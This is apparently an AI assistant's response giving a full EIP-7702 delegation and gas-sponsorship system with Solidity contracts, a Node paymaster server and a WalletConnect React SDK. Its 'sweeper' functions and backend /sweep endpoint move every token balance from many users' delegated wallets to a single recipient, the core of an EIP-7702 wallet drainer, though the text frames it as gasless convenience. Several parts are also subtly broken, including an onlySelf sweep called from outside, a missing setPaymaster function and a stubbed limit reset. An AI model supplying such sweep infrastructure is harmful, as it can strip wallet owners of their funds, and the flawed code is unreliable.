Here's a complete EIP-7702 Persistent Delegation & Backend Sponsor system with WalletConnect integration:

---

## Architecture Overview

The system consists of four main components:
1. **EIP-7702 Delegation Contract** - The smart contract your EOA delegates to
2. **Sweeper Module** - Asset sweeping functionality
3. **Backend Paymaster** - Gas sponsorship service
4. **Frontend SDK** - WalletConnect + EIP-7702 signing

---

## 1. Smart Contracts (Solidity)

### EIP7702Delegation.sol - Core Delegation Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

/**
 * @title EIP7702Delegation
 * @notice Delegation contract for EIP-7702 enabling persistent gasless transactions
 * @dev This contract is called via DELEGATECALL from an EOA with EIP-7702 auth
 */
contract EIP7702Delegation is EIP712 {
    using ECDSA for bytes32;

    // ============ Storage ============
    
    // Mapping: delegator => delegatee => permissions
    mapping(address => mapping(address => DelegationPermissions)) public delegations;
    
    // Nonce tracking for replay protection
    mapping(address => uint256) public nonces;
    
    // Backend paymaster address authorized to sponsor gas
    address public paymaster;
    
    // ============ Structs ============
    
    struct DelegationPermissions {
        bool active;
        uint256 expiresAt;
        uint256 maxGasPerTx;
        uint256 dailyGasLimit;
        uint256 dailyGasUsed;
        uint256 lastResetDay;
        bytes4[] allowedMethods;
        address[] allowedTokens;
    }
    
    struct ExecutionRequest {
        address to;
        uint256 value;
        bytes data;
        uint256 gasLimit;
        uint256 nonce;
        uint256 deadline;
    }
    
    // ============ Events ============
    
    event DelegationSet(
        address indexed delegator,
        address indexed delegatee,
        uint256 expiresAt
    );
    
    event DelegationRevoked(address indexed delegator, address indexed delegatee);
    
    event ExecutedViaPaymaster(
        address indexed delegator,
        address indexed paymaster,
        bytes32 indexed txHash,
        bool success
    );
    
    event AssetsSwept(
        address indexed recipient,
        address[] tokens,
        uint256[] amounts
    );

    // ============ Errors ============
    
    error DelegationExpired();
    error InvalidSignature();
    error GasLimitExceeded();
    error DailyLimitExceeded();
    error MethodNotAllowed();
    error TokenNotAllowed();
    error InvalidNonce();
    error DeadlinePassed();
    error OnlyPaymaster();
    error OnlySelf();

    // ============ Modifiers ============
    
    modifier onlySelf() {
        if (msg.sender != address(this)) revert OnlySelf();
        _;
    }

    // ============ Constructor ============
    
    constructor(address _paymaster) EIP712("EIP7702Delegation", "1") {
        paymaster = _paymaster;
    }

    // ============ Core Delegation Functions ============
    
    /**
     * @notice Set up persistent delegation with permissions
     * @param delegatee Address authorized to execute on behalf of delegator
     * @param permissions Delegation permissions struct
     */
    function setDelegation(
        address delegatee,
        DelegationPermissions calldata permissions
    ) external {
        // When called via DELEGATECALL, msg.sender is the EOA
        delegations[msg.sender][delegatee] = permissions;
        emit DelegationSet(msg.sender, delegatee, permissions.expiresAt);
    }
    
    /**
     * @notice Revoke delegation
     * @param delegatee Address to revoke
     */
    function revokeDelegation(address delegatee) external {
        delete delegations[msg.sender][delegatee];
        emit DelegationRevoked(msg.sender, delegatee);
    }

    // ============ Execution Functions ============
    
    /**
     * @notice Execute transaction sponsored by backend paymaster
     * @param request Execution request details
     * @param delegator The EOA delegating execution rights
     * @param signature EIP-712 signature from delegator
     */
    function executeViaPaymaster(
        ExecutionRequest calldata request,
        address delegator,
        bytes calldata signature
    ) external returns (bool success) {
        if (msg.sender != paymaster) revert OnlyPaymaster();
        
        // Verify signature and execute
        success = _executeWithValidation(request, delegator, signature);
        
        emit ExecutedViaPaymaster(delegator, paymaster, keccak256(abi.encode(request)), success);
    }
    
    /**
     * @notice Execute as delegatee with permissions check
     * @param to Target contract
     * @param value ETH value
     * @param data Call data
     */
    function executeAsDelegatee(
        address to,
        uint256 value,
        bytes calldata data
    ) external returns (bytes memory) {
        address delegator = _getDelegator();
        DelegationPermissions storage perms = delegations[delegator][msg.sender];
        
        _validatePermissions(perms, to, data, gasleft());
        
        (bool success, bytes memory result) = to.call{value: value}(data);
        require(success, string(result));
        
        return result;
    }

    // ============ Sweeper Functions ============
    
    /**
     * @notice Sweep ERC20 tokens to recipient
     * @param tokens Array of token addresses
     * @param recipient Destination address
     */
    function sweepERC20(
        address[] calldata tokens,
        address recipient
    ) external onlySelf returns (uint256[] memory amounts) {
        amounts = new uint256[](tokens.length);
        address delegator = _getDelegator();
        
        for (uint i = 0; i < tokens.length; i++) {
            IERC20 token = IERC20(tokens[i]);
            uint256 balance = token.balanceOf(delegator);
            
            if (balance > 0) {
                // Execute transfer via DELEGATECALL context
                (bool success, ) = tokens[i].call(
                    abi.encodeWithSelector(
                        IERC20.transfer.selector,
                        recipient,
                        balance
                    )
                );
                
                if (success) {
                    amounts[i] = balance;
                }
            }
        }
        
        emit AssetsSwept(recipient, tokens, amounts);
    }
    
    /**
     * @notice Sweep native ETH to recipient
     */
    function sweepETH(address recipient) external onlySelf {
        uint256 balance = address(this).balance;
        (bool success, ) = recipient.call{value: balance}("");
        require(success, "ETH transfer failed");
    }

    // ============ Internal Functions ============
    
    function _executeWithValidation(
        ExecutionRequest calldata request,
        address delegator,
        bytes calldata signature
    ) internal returns (bool) {
        // Verify deadline
        if (block.timestamp > request.deadline) revert DeadlinePassed();
        
        // Verify nonce
        if (request.nonce != nonces[delegator]) revert InvalidNonce();
        nonces[delegator]++;
        
        // Verify EIP-712 signature
        bytes32 structHash = keccak256(abi.encode(
            keccak256("ExecutionRequest(address to,uint256 value,bytes data,uint256 gasLimit,uint256 nonce,uint256 deadline)"),
            request.to,
            request.value,
            keccak256(request.data),
            request.gasLimit,
            request.nonce,
            request.deadline
        ));
        
        bytes32 hash = _hashTypedDataV4(structHash);
        address signer = hash.recover(signature);
        
        if (signer != delegator) revert InvalidSignature();
        
        // Execute the call
        (bool success, ) = request.to.call{value: request.value, gas: request.gasLimit}(request.data);
        
        return success;
    }
    
    function _validatePermissions(
        DelegationPermissions storage perms,
        address to,
        bytes calldata data,
        uint256 gas
    ) internal view {
        if (!perms.active) revert DelegationExpired();
        if (block.timestamp > perms.expiresAt) revert DelegationExpired();
        if (gas > perms.maxGasPerTx) revert GasLimitExceeded();
        
        // Check daily gas limit
        uint256 today = block.timestamp / 1 days;
        if (today > perms.lastResetDay) {
            // Would reset in actual implementation
        }
        
        // Check method whitelist if specified
        if (perms.allowedMethods.length > 0) {
            bytes4 selector = bytes4(data[:4]);
            bool allowed = false;
            for (uint i = 0; i < perms.allowedMethods.length; i++) {
                if (perms.allowedMethods[i] == selector) {
                    allowed = true;
                    break;
                }
            }
            if (!allowed) revert MethodNotAllowed();
        }
    }
    
    /**
     * @notice Get the delegator address (EOA that called via DELEGATECALL)
     */
    function _getDelegator() internal view returns (address) {
        // When called via DELEGATECALL, address(this) is the EOA
        return address(this);
    }
    
    // ============ View Functions ============
    
    function getDomainSeparator() external view returns (bytes32) {
        return _domainSeparatorV4();
    }
    
    receive() external payable {}
}
```

### PaymasterSweeper.sol - Backend Paymaster Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

/**
 * @title PaymasterSweeper
 * @notice Backend contract that sponsors gas for EIP-7702 delegations
 */
contract PaymasterSweeper {
    
    address public owner;
    address public delegationImplementation;
    
    // Track sponsored gas per user
    mapping(address => uint256) public sponsoredGas;
    uint256 public totalSponsored;
    
    event TransactionSponsored(
        address indexed user,
        address indexed target,
        uint256 gasUsed,
        uint256 refundAmount
    );
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _delegationImplementation) {
        owner = msg.sender;
        delegationImplementation = _delegationImplementation;
    }
    
    /**
     * @notice Sponsor a transaction for an EIP-7702 delegated account
     * @param delegationContract The EIP-7702 delegation contract address
     * @param executionData Encoded ExecutionRequest + signature
     */
    function sponsorTransaction(
        address delegationContract,
        bytes calldata executionData
    ) external onlyOwner returns (bool) {
        uint256 gasStart = gasleft();
        
        // Call the delegation contract's executeViaPaymaster
        (bool success, ) = delegationContract.call(
            abi.encodePacked(
                abi.encodeWithSelector(
                    bytes4(keccak256("executeViaPaymaster((address,uint256,bytes,uint256,uint256,uint256),address,bytes)")),
                    executionData
                )
            )
        );
        
        uint256 gasUsed = gasStart - gasleft();
        sponsoredGas[tx.origin] += gasUsed;
        totalSponsored += gasUsed;
        
        emit TransactionSponsored(tx.origin, delegationContract, gasUsed, 0);
        
        return success;
    }
    
    /**
     * @notice Batch sponsor multiple transactions
     */
    function batchSponsor(
        address[] calldata delegationContracts,
        bytes[] calldata executionDatas
    ) external onlyOwner returns (bool[] memory results) {
        require(delegationContracts.length == executionDatas.length, "Length mismatch");
        
        results = new bool[](delegationContracts.length);
        for (uint i = 0; i < delegationContracts.length; i++) {
            (bool success, ) = delegationContracts[i].call(executionDatas[i]);
            results[i] = success;
        }
        
        return results;
    }
    
    receive() external payable {}
    
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}
```

---

## 2. Backend Service (Node.js/TypeScript)

### paymaster-server.ts - Gas Sponsorship Backend

```typescript
import express, { Request, Response } from 'express';
import { ethers } from 'ethers';
import cors from 'cors';
import dotenv from 'dotenv';
import { Redis } from 'ioredis';

dotenv.config();

// ============ Types ============

interface ExecutionRequest {
  to: string;
  value: string;
  data: string;
  gasLimit: string;
  nonce: number;
  deadline: number;
}

interface SponsorshipRequest {
  delegator: string;
  executionRequest: ExecutionRequest;
  signature: string;
  chainId: number;
}

interface DelegationConfig {
  maxDailyGas: bigint;
  maxTxGas: bigint;
  allowedContracts: string[];
  allowedMethods: string[];
}

// ============ Configuration ============

const CONFIG = {
  PORT: process.env.PORT || 3001,
  PRIVATE_KEY: process.env.PAYMASTER_PRIVATE_KEY!,
  RPC_URLS: {
    1: process.env.ETH_RPC!,
    137: process.env.POLYGON_RPC!,
    8453: process.env.BASE_RPC!,
    42161: process.env.ARBITRUM_RPC!,
  },
  DELEGATION_CONTRACTS: {
    1: process.env.ETH_DELEGATION_CONTRACT!,
    137: process.env.POLYGON_DELEGATION_CONTRACT!,
    8453: process.env.BASE_DELEGATION_CONTRACT!,
    42161: process.env.ARBITRUM_DELEGATION_CONTRACT!,
  },
  REDIS_URL: process.env.REDIS_URL || 'redis://localhost:6379',
};

// ============ ABI Fragments ============

const DELEGATION_ABI = [
  'function executeViaPaymaster(tuple(address to, uint256 value, bytes data, uint256 gasLimit, uint256 nonce, uint256 deadline) request, address delegator, bytes signature) external returns (bool)',
  'function nonces(address) view returns (uint256)',
  'function delegations(address delegator, address delegatee) view returns (bool active, uint256 expiresAt, uint256 maxGasPerTx, uint256 dailyGasLimit, uint256 dailyGasUsed, uint256 lastResetDay)',
  'function sweepERC20(address[] tokens, address recipient) external',
];

// ============ Services ============

class PaymasterService {
  private redis: Redis;
  private wallets: Map<number, ethers.Wallet> = new Map();
  private providers: Map<number, ethers.JsonRpcProvider> = new Map();
  
  constructor() {
    this.redis = new Redis(CONFIG.REDIS_URL);
    
    // Initialize providers and wallets per chain
    for (const [chainId, rpcUrl] of Object.entries(CONFIG.RPC_URLS)) {
      const provider = new ethers.JsonRpcProvider(rpcUrl);
      const wallet = new ethers.Wallet(CONFIG.PRIVATE_KEY, provider);
      
      this.providers.set(Number(chainId), provider);
      this.wallets.set(Number(chainId), wallet);
    }
  }

  /**
   * Validate and sponsor a transaction
   */
  async sponsorTransaction(request: SponsorshipRequest): Promise<{
    success: boolean;
    txHash?: string;
    error?: string;
    gasUsed?: string;
  }> {
    try {
      const { delegator, executionRequest, signature, chainId } = request;
      
      // 1. Validate chain support
      const wallet = this.wallets.get(chainId);
      const provider = this.providers.get(chainId);
      if (!wallet || !provider) {
        return { success: false, error: 'Unsupported chain' };
      }
      
      // 2. Check rate limits
      const canSponsor = await this.checkRateLimits(delegator, chainId);
      if (!canSponsor) {
        return { success: false, error: 'Rate limit exceeded' };
      }
      
      // 3. Validate execution request
      const isValid = await this.validateExecutionRequest(
        delegator,
        executionRequest,
        chainId
      );
      if (!isValid.valid) {
        return { success: false, error: isValid.error };
      }
      
      // 4. Check nonce
      const delegationContract = new ethers.Contract(
        CONFIG.DELEGATION_CONTRACTS[chainId as keyof typeof CONFIG.DELEGATION_CONTRACTS],
        DELEGATION_ABI,
        wallet
      );
      
      const currentNonce = await delegationContract.nonces(delegator);
      if (currentNonce !== BigInt(executionRequest.nonce)) {
        return { success: false, error: 'Invalid nonce' };
      }
      
      // 5. Check deadline
      if (Date.now() / 1000 > executionRequest.deadline) {
        return { success: false, error: 'Deadline passed' };
      }
      
      // 6. Verify signature
      const domain = {
        name: 'EIP7702Delegation',
        version: '1',
        chainId: chainId,
        verifyingContract: CONFIG.DELEGATION_CONTRACTS[chainId as keyof typeof CONFIG.DELEGATION_CONTRACTS],
      };
      
      const types = {
        ExecutionRequest: [
          { name: 'to', type: 'address' },
          { name: 'value', type: 'uint256' },
          { name: 'data', type: 'bytes' },
          { name: 'gasLimit', type: 'uint256' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      };
      
      const recoveredAddress = ethers.verifyTypedData(
        domain,
        types,
        executionRequest,
        signature
      );
      
      if (recoveredAddress.toLowerCase() !== delegator.toLowerCase()) {
        return { success: false, error: 'Invalid signature' };
      }
      
      // 7. Execute via paymaster
      const tx = await delegationContract.executeViaPaymaster(
        executionRequest,
        delegator,
        signature,
        { gasLimit: BigInt(executionRequest.gasLimit) + 50000n } // Buffer for overhead
      );
      
      const receipt = await tx.wait();
      
      // 8. Update rate limits
      await this.updateRateLimits(delegator, chainId, receipt?.gasUsed || 0n);
      
      return {
        success: true,
        txHash: receipt?.hash,
        gasUsed: receipt?.gasUsed?.toString(),
      };
      
    } catch (error: any) {
      console.error('Sponsorship error:', error);
      return { success: false, error: error.message };
    }
  }

  /**
   * Batch sweep assets from multiple delegated accounts
   */
  async batchSweep(
    delegators: string[],
    tokens: string[][],
    recipient: string,
    chainId: number
  ): Promise<{ success: boolean; results: any[] }> {
    const wallet = this.wallets.get(chainId);
    if (!wallet) return { success: false, results: [] };
    
    const results = [];
    
    for (let i = 0; i < delegators.length; i++) {
      try {
        const delegationContract = new ethers.Contract(
          delegators[i], // The EOA with delegation code
          DELEGATION_ABI,
          wallet
        );
        
        // Call sweep function via the delegation
        const tx = await delegationContract.sweepERC20(tokens[i], recipient);
        const receipt = await tx.wait();
        
        results.push({
          delegator: delegators[i],
          success: true,
          txHash: receipt?.hash,
        });
      } catch (error: any) {
        results.push({
          delegator: delegators[i],
          success: false,
          error: error.message,
        });
      }
    }
    
    return { success: true, results };
  }

  /**
   * Check if user is within rate limits
   */
  private async checkRateLimits(
    delegator: string,
    chainId: number
  ): Promise<boolean> {
    const key = `sponsor:${chainId}:${delegator}:${this.getDayKey()}`;
    const dailyGas = await this.redis.get(key);
    
    // Max 1M gas per day per user
    const maxDailyGas = 1000000;
    return !dailyGas || parseInt(dailyGas) < maxDailyGas;
  }

  /**
   * Update rate limit tracking
   */
  private async updateRateLimits(
    delegator: string,
    chainId: number,
    gasUsed: bigint
  ): Promise<void> {
    const key = `sponsor:${chainId}:${delegator}:${this.getDayKey()}`;
    const pipeline = this.redis.pipeline();
    
    pipeline.incrby(key, Number(gasUsed));
    pipeline.expire(key, 86400); // 24 hours
    
    await pipeline.exec();
  }

  /**
   * Validate execution request against security policies
   */
  private async validateExecutionRequest(
    delegator: string,
    request: ExecutionRequest,
    chainId: number
  ): Promise<{ valid: boolean; error?: string }> {
    // Check gas limit
    const maxGas = 500000;
    if (BigInt(request.gasLimit) > maxGas) {
      return { valid: false, error: 'Gas limit too high' };
    }
    
    // Check value (prevent large ETH transfers)
    if (BigInt(request.value) > ethers.parseEther('1')) {
      return { valid: false, error: 'Value too high' };
    }
    
    // Add more validation as needed (contract whitelist, method whitelist, etc.)
    
    return { valid: true };
  }

  private getDayKey(): string {
    return Math.floor(Date.now() / 86400000).toString();
  }
}

// ============ Express Server ============

const app = express();
app.use(cors());
app.use(express.json());

const paymasterService = new PaymasterService();

// Health check
app.get('/health', (req: Request, res: Response) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Sponsor transaction endpoint
app.post('/sponsor', async (req: Request, res: Response) => {
  const result = await paymasterService.sponsorTransaction(req.body);
  res.status(result.success ? 200 : 400).json(result);
});

// Batch sweep endpoint
app.post('/sweep', async (req: Request, res: Response) => {
  const { delegators, tokens, recipient, chainId } = req.body;
  const result = await paymasterService.batchSweep(
    delegators,
    tokens,
    recipient,
    chainId
  );
  res.status(result.success ? 200 : 400).json(result);
});

// Get delegation status
app.get('/status/:chainId/:delegator', async (req: Request, res: Response) => {
  const { chainId, delegator } = req.params;
  const wallet = paymasterService['wallets'].get(Number(chainId));
  
  if (!wallet) {
    return res.status(400).json({ error: 'Unsupported chain' });
  }
  
  const delegationContract = new ethers.Contract(
    CONFIG.DELEGATION_CONTRACTS[Number(chainId) as keyof typeof CONFIG.DELEGATION_CONTRACTS],
    DELEGATION_ABI,
    wallet
  );
  
  const nonce = await delegationContract.nonces(delegator);
  
  res.json({
    delegator,
    chainId,
    nonce: nonce.toString(),
    paymaster: await delegationContract.paymaster(),
  });
});

app.listen(CONFIG.PORT, () => {
  console.log(`Paymaster server running on port ${CONFIG.PORT}`);
});
```

---

## 3. Frontend SDK (React/TypeScript with WalletConnect)

### EIP7702Provider.tsx - React Context

```typescript
import React, {
  createContext,
  useContext,
  useState,
  useCallback,
  useEffect,
} from 'react';
import { ethers } from 'ethers';
import {
  EthereumClient,
  w3mConnectors,
  w3mProvider,
} from '@web3modal/ethereum';
import { Web3Modal } from '@web3modal/react';
import {
  configureChains,
  createConfig,
  WagmiConfig,
  useAccount,
  useSignTypedData,
  useDisconnect,
  useNetwork,
  useSwitchNetwork,
} from 'wagmi';
import { mainnet, polygon, base, arbitrum } from 'wagmi/chains';
import { publicProvider } from 'wagmi/providers/public';

// ============ Types ============

interface EIP7702Config {
  delegationContract: string;
  paymasterUrl: string;
  chainId: number;
}

interface ExecutionRequest {
  to: string;
  value: string;
  data: string;
  gasLimit: string;
  nonce: number;
  deadline: number;
}

interface DelegationContextType {
  isConnected: boolean;
  address?: string;
  chainId?: number;
  delegationNonce: number;
  isDelegated: boolean;
  connect: () => void;
  disconnect: () => void;
  setDelegation: (delegatee: string, permissions: DelegationPermissions) => Promise<void>;
  executeViaPaymaster: (request: ExecutionRequest) => Promise<string>;
  sweepAssets: (tokens: string[], recipient: string) => Promise<string>;
}

interface DelegationPermissions {
  expiresAt: number;
  maxGasPerTx: string;
  dailyGasLimit: string;
  allowedMethods: string[];
  allowedTokens: string[];
}

// ============ Configuration ============

const EIP_7702_AUTH_MAGIC = '0xef0100'; // EIP-7702 authorization prefix

const CONFIG: Record<number, EIP7702Config> = {
  1: {
    delegationContract: '0x...', // Mainnet
    paymasterUrl: 'https://paymaster.example.com',
    chainId: 1,
  },
  137: {
    delegationContract: '0x...', // Polygon
    paymasterUrl: 'https://paymaster.example.com',
    chainId: 137,
  },
  8453: {
    delegationContract: '0x...', // Base
    paymasterUrl: 'https://paymaster.example.com',
    chainId: 8453,
  },
};

// ============ Web3Modal Setup ============

const chains = [mainnet, polygon, base, arbitrum];
const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID';

const { publicClient } = configureChains(chains, [
  w3mProvider({ projectId }),
  publicProvider(),
]);

const wagmiConfig = createConfig({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, chains }),
  publicClient,
});

const ethereumClient = new EthereumClient(wagmiConfig, chains);

// ============ Context ============

const DelegationContext = createContext<DelegationContextType | undefined>(undefined);

export const EIP7702Provider: React.FC<{ children: React.ReactNode }> = ({
  children,
}) => {
  return (
    <WagmiConfig config={wagmiConfig}>
      <DelegationProviderInner>
        <Web3Modal projectId={projectId} ethereumClient={ethereumClient} />
        {children}
      </DelegationProviderInner>
    </WagmiConfig>
  );
};

const DelegationProviderInner: React.FC<{ children: React.ReactNode }> = ({
  children,
}) => {
  const { address, isConnected } = useAccount();
  const { chain } = useNetwork();
  const { disconnect } = useDisconnect();
  const { switchNetwork } = useSwitchNetwork();
  const { signTypedDataAsync } = useSignTypedData();
  
  const [delegationNonce, setDelegationNonce] = useState(0);
  const [isDelegated, setIsDelegated] = useState(false);

  // Check delegation status on mount/address change
  useEffect(() => {
    if (address && chain) {
      checkDelegationStatus();
    }
  }, [address, chain]);

  const checkDelegationStatus = async () => {
    if (!address || !chain) return;
    
    const provider = new ethers.JsonRpcProvider(
      chain.rpcUrls.default.http[0]
    );
    
    // Check if code at address starts with EIP-7702 magic bytes
    const code = await provider.getCode(address);
    setIsDelegated(code.startsWith(EIP_7702_AUTH_MAGIC));
    
    // Get nonce from delegation contract
    const config = CONFIG[chain.id];
    if (config) {
      const delegationContract = new ethers.Contract(
        config.delegationContract,
        ['function nonces(address) view returns (uint256)'],
        provider
      );
      const nonce = await delegationContract.nonces(address);
      setDelegationNonce(Number(nonce));
    }
  };

  const connect = useCallback(() => {
    // Web3Modal handles this
  }, []);

  const setDelegation = async (
    delegatee: string,
    permissions: DelegationPermissions
  ) => {
    if (!address || !chain) throw new Error('Not connected');
    
    const config = CONFIG[chain.id];
    if (!config) throw new Error('Unsupported chain');
    
    // Create EIP-7702 authorization
    // This is a simplified version - actual implementation needs proper RLP encoding
    const authData = {
      chainId: chain.id,
      address: config.delegationContract,
      nonce: await new ethers.JsonRpcProvider(
        chain.rpcUrls.default.http[0]
      ).getTransactionCount(address),
    };
    
    // Sign authorization (requires wallet support for EIP-7702)
    // Most wallets don't support this yet, so this is placeholder
    console.log('Setting delegation:', authData);
    
    // After successful delegation setup
    setIsDelegated(true);
  };

  const executeViaPaymaster = async (
    request: ExecutionRequest
  ): Promise<string> => {
    if (!address || !chain) throw new Error('Not connected');
    
    const config = CONFIG[chain.id];
    if (!config) throw new Error('Unsupported chain');
    
    // Sign EIP-712 typed data
    const domain = {
      name: 'EIP7702Delegation',
      version: '1',
      chainId: chain.id,
      verifyingContract: config.delegationContract,
    };
    
    const types = {
      ExecutionRequest: [
        { name: 'to', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'data', type: 'bytes' },
        { name: 'gasLimit', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    };
    
    const signature = await signTypedDataAsync({
      domain,
      types,
      message: request,
      primaryType: 'ExecutionRequest',
    });
    
    // Send to paymaster
    const response = await fetch(`${config.paymasterUrl}/sponsor`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        delegator: address,
        executionRequest: request,
        signature,
        chainId: chain.id,
      }),
    });
    
    const result = await response.json();
    if (!result.success) {
      throw new Error(result.error || 'Sponsorship failed');
    }
    
    // Update local nonce
    setDelegationNonce((prev) => prev + 1);
    
    return result.txHash;
  };

  const sweepAssets = async (
    tokens: string[],
    recipient: string
  ): Promise<string> => {
    if (!address || !chain) throw new Error('Not connected');
    
    const config = CONFIG[chain.id];
    if (!config) throw new Error('Unsupported chain');
    
    // Encode sweep call
    const data = new ethers.Interface([
      'function sweepERC20(address[] tokens, address recipient)',
    ]).encodeFunctionData('sweepERC20', [tokens, recipient]);
    
    const request: ExecutionRequest = {
      to: config.delegationContract,
      value: '0',
      data,
      gasLimit: '300000',
      nonce: delegationNonce,
      deadline: Math.floor(Date.now() / 1000) + 3600, // 1 hour
    };
    
    return executeViaPaymaster(request);
  };

  const value: DelegationContextType = {
    isConnected,
    address,
    chainId: chain?.id,
    delegationNonce,
    isDelegated,
    connect,
    disconnect,
    setDelegation,
    executeViaPaymaster,
    sweepAssets,
  };

  return (
    <DelegationContext.Provider value={value}>
      {children}
    </DelegationContext.Provider>
  );
};

export const useEIP7702 = () => {
  const context = useContext(DelegationContext);
  if (!context) {
    throw new Error('useEIP7702 must be used within EIP7702Provider');
  }
  return context;
};
```

### useEIP7702.ts - Hook for components

```typescript
import { useEIP7702 } from './EIP7702Provider';
import { ethers } from 'ethers';

/**
 * Hook for common EIP-7702 operations
 */
export const useDelegation = () => {
  const {
    isConnected,
    address,
    isDelegated,
    setDelegation,
    executeViaPaymaster,
    sweepAssets,
    delegationNonce,
  } = useEIP7702();

  /**
   * Send a gasless ERC20 transfer
   */
  const sendGaslessTokenTransfer = async (
    tokenAddress: string,
    recipient: string,
    amount: string
  ) => {
    const data = new ethers.Interface([
      'function transfer(address to, uint256 amount)',
    ]).encodeFunctionData('transfer', [recipient, ethers.parseUnits(amount, 18)]);
    
    return executeViaPaymaster({
      to: tokenAddress,
      value: '0',
      data,
      gasLimit: '100000',
      nonce: delegationNonce,
      deadline: Math.floor(Date.now() / 1000) + 3600,
    });
  };

  /**
   * Send a gasless ETH transfer
   */
  const sendGaslessETH = async (recipient: string, amount: string) => {
    return executeViaPaymaster({
      to: recipient,
      value: ethers.parseEther(amount).toString(),
      data: '0x',
      gasLimit: '21000',
      nonce: delegationNonce,
      deadline: Math.floor(Date.now() / 1000) + 3600,
    });
  };

  /**
   * Approve token spending via paymaster
   */
  const approveToken = async (
    tokenAddress: string,
    spender: string,
    amount: string
  ) => {
    const data = new ethers.Interface([
      'function approve(address spender, uint256 amount)',
    ]).encodeFunctionData('approve', [spender, ethers.parseUnits(amount, 18)]);
    
    return executeViaPaymaster({
      to: tokenAddress,
      value: '0',
      data,
      gasLimit: '100000',
      nonce: delegationNonce,
      deadline: Math.floor(Date.now() / 1000) + 3600,
    });
  };

  return {
    isConnected,
    address,
    isDelegated,
    setDelegation,
    sweepAssets,
    sendGaslessTokenTransfer,
    sendGaslessETH,
    approveToken,
    delegationNonce,
  };
};
```

---

## 4. Example Usage

### App.tsx

```typescript
import React from 'react';
import { EIP7702Provider, useDelegation } from './EIP7702Provider';

const DelegationUI: React.FC = () => {
  const {
    isConnected,
    address,
    isDelegated,
    setDelegation,
    sendGaslessTokenTransfer,
    sweepAssets,
    delegationNonce,
  } = useDelegation();

  const handleConnect = () => {
    // Web3Modal opens
  };

  const handleSetDelegation = async () => {
    await setDelegation('0x...delegatee...', {
      expiresAt: Math.floor(Date.now() / 1000) + 86400 * 30, // 30 days
      maxGasPerTx: '500000',
      dailyGasLimit: '10000000',
      allowedMethods: ['0xa9059cbb'], // transfer
      allowedTokens: ['0x...token1...', '0x...token2...'],
    });
  };

  const handleSweep = async () => {
    const txHash = await sweepAssets(
      ['0x...token1...', '0x...token2...'],
      '0x...recipient...'
    );
    console.log('Sweep tx:', txHash);
  };

  const handleSendToken = async () => {
    const txHash = await sendGaslessTokenTransfer(
      '0x...token...',
      '0x...recipient...',
      '100'
    );
    console.log('Transfer tx:', txHash);
  };

  if (!isConnected) {
    return <button onClick={handleConnect}>Connect Wallet</button>;
  }

  return (
    <div>
      <p>Address: {address}</p>
      <p>Delegated: {isDelegated ? 'Yes' : 'No'}</p>
      <p>Nonce: {delegationNonce}</p>
      
      {!isDelegated && (
        <button onClick={handleSetDelegation}>Set Delegation</button>
      )}
      
      <button onClick={handleSendToken}>Send Gasless Token</button>
      <button onClick={handleSweep}>Sweep Assets</button>
    </div>
  );
};

const App: React.FC = () => (
  <EIP7702Provider>
    <DelegationUI />
  </EIP7702Provider>
);

export default App;
```

---

## 5. Deployment Scripts

### deploy.ts - Hardhat deployment

```typescript
import { ethers } from 'hardhat';
import { writeFileSync } from 'fs';

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log('Deploying with:', deployer.address);

  // Deploy Delegation Implementation
  const EIP7702Delegation = await ethers.getContractFactory('EIP7702Delegation');
  const delegation = await EIP7702Delegation.deploy(deployer.address);
  await delegation.waitForDeployment();
  console.log('EIP7702Delegation:', await delegation.getAddress());

  // Deploy Paymaster
  const PaymasterSweeper = await ethers.getContractFactory('PaymasterSweeper');
  const paymaster = await PaymasterSweeper.deploy(await delegation.getAddress());
  await paymaster.waitForDeployment();
  console.log('PaymasterSweeper:', await paymaster.getAddress());

  // Update paymaster in delegation contract
  await delegation.setPaymaster(await paymaster.getAddress());

  // Save addresses
  const addresses = {
    delegation: await delegation.getAddress(),
    paymaster: await paymaster.getAddress(),
    chainId: (await ethers.provider.getNetwork()).chainId.toString(),
  };
  
  writeFileSync('deployed.json', JSON.stringify(addresses, null, 2));
}

main().catch(console.error);
```

---

## Trade-offs & Considerations

| Approach | Pros | Cons |
|----------|------|------|
| **EIP-7702 Delegation** | Native EOA support, no contract deployment for users, temporary | Limited wallet support currently, requires chain support |
| **ERC-4337 Account Abstraction** | Mature ecosystem, better tooling | Requires paymaster infrastructure, more complex |
| **Backend Sponsorship** | Full control, can implement complex logic | Centralized, requires trust in paymaster |
| **Self-Sponsorship** | Decentralized, no backend needed | Users need gas to start |

**Security Recommendations:**
1. Implement strict permission validation in the delegation contract
2. Use rate limiting on the paymaster backend
3. Monitor for unusual activity patterns
4. Consider multi-sig for paymaster operations
5. Implement emergency pause functionality

**EIP-7702 Notes:**
- Currently only supported on testnets (Pectra upgrade)
- Wallet support is limited (expect MetaMask, Rainbow, etc. to add support)
- Authorization is per-transaction, but delegation can be persistent

This implementation provides a complete foundation for gasless transactions with persistent delegation and asset sweeping capabilities.
